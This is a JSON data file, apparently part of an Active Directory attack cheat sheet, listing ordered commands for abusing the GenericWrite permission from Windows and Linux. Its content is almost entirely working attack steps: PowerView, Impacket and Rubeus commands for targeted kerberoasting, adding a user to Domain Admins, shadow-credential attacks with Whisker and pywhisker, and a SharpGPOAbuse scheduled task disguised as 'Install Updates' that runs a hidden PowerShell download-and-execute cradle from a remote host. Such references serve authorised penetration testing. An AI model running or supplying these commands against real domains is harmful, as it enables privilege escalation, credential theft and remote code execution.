{
    "GenericWrite": {
        "meaning": "Generic Write access grants you the ability to write to any non-protected attribute on the target object, including \"members\" for a group, and \"servicePrincipalNames\" for a user.",
        "common": "",
        "windows": {
            "PowerView_SPN": [
                {
                    "order": 1,
                    "command": "$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force",
                    "description": "Create secure password credential"
                },
                {
                    "order": 2,
                    "command": "$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)",
                    "description": "Create PSCredential object"
                },
                {
                    "order": 3,
                    "command": "Set-DomainObject -Credential $Cred -Identity harmj0y -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}",
                    "description": "Write to servicePrincipalNames attribute for kerberoasting"
                },
                {
                    "order": 4,
                    "command": "Get-DomainSPNTicket -Credential $Cred harmj0y | fl",
                    "description": "Request service ticket for kerberoasting attack"
                }
            ],
            "PowerView_GroupMember": [
                {
                    "order": 1,
                    "command": "$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force",
                    "description": "Create secure password credential"
                },
                {
                    "order": 2,
                    "command": "$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)",
                    "description": "Create PSCredential object"
                },
                {
                    "order": 3,
                    "command": "Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred",
                    "description": "Add member to group using generic write access"
                }
            ],
            "SharpGPOAbuse": [
                {
                    "order": 1,
                    "command": "SharpGPOAbuse.exe --AddComputerTask --TaskName \"Install Updates\" --Author DOMAIN\\Admin --Command \"cmd.exe\" --Arguments \"/c powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://10.1.1.1:80/a'))\\\"\" --GPOName \"Default Domain Policy\"",
                    "description": "Abuse GPO with generic write to add malicious scheduled task"
                }
            ],
            "Whisker": [
                {
                    "order": 1,
                    "command": "Whisker.exe add /target:targetuser /domain:domain.com /dc:dc.domain.com",
                    "description": "Add shadow credential using msds-KeyCredentialLink attribute"
                },
                {
                    "order": 2,
                    "command": "Rubeus.exe asktgt /user:targetuser /certificate:cert.pfx /password:password /domain:domain.com /dc:dc.domain.com /ptt",
                    "description": "Authenticate using shadow credential"
                }
            ]
        },
        "linux": {
            "pyGPOAbuse": [
                {
                    "order": 1,
                    "command": "python3 pyGPOAbuse.py DOMAIN/user:password@domain-controller -gpo-id \"GPO-ID-HERE\"",
                    "description": "Abuse GPO from Linux using pyGPOAbuse"
                }
            ],
            "Impacket_SPN": [
                {
                    "order": 1,
                    "command": "addspn.py -u 'DOMAIN\\user' -p 'password' -t targetuser -s 'HTTP/fake.service' dc.domain.com",
                    "description": "Add SPN to user for kerberoasting (using custom script)"
                },
                {
                    "order": 2,
                    "command": "GetUserSPNs.py DOMAIN/user:password -request -dc-ip dc.domain.com",
                    "description": "Request service tickets for kerberoasting"
                }
            ],
            "PKINITtools": [
                {
                    "order": 1,
                    "command": "python3 pywhisker.py -d domain.com -u user -p password --target targetuser --action add",
                    "description": "Add shadow credential using pywhisker"
                },
                {
                    "order": 2,
                    "command": "python3 gettgtpkinit.py domain.com/targetuser -cert-pfx cert.pfx -pfx-pass password",
                    "description": "Get TGT using shadow credential"
                }
            ]
        }
    }
}
